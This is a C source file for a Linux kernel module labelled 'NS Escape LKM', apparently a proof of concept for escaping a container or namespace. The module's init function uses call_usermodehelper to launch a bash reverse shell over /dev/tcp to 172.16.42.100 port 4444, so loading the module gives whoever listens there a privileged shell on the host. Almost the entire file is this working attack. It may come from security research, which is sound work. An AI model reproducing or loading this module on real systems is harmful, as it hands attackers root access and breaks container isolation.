#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/init.h> /* Needed for the macros */
#include <linux/sched/signal.h>
#include <linux/nsproxy.h>
#include <linux/proc_ns.h>
///< The license type -- this affects runtime behavior
MODULE_LICENSE("GPL");
///< The author -- visible when you use modinfo
MODULE_AUTHOR("Nimrod Stoler");
///< The description -- see modinfo
MODULE_DESCRIPTION("NS Escape LKM");
///< The version of the module
MODULE_VERSION("0.1");
static int __init escape_start(void)
{
    int rc;
    static char *envp[] = {
        "SHELL=/bin/bash",
        "HOME=/home/cyberark",
        "USER=cyberark",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin",
        "DISPLAY=:0",
        NULL
    };
    char *argv[] = {"/bin/bash","-c", "bash -i >& /dev/tcp/172.16.42.100/4444 0>&1", NULL};
    rc = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    printk("RC is: %i \n", rc);
    return 0;
}


static void __exit escape_end(void)
{
    printk(KERN_EMERG "Goodbye!\n");
}
module_init(escape_start);
module_exit(escape_end);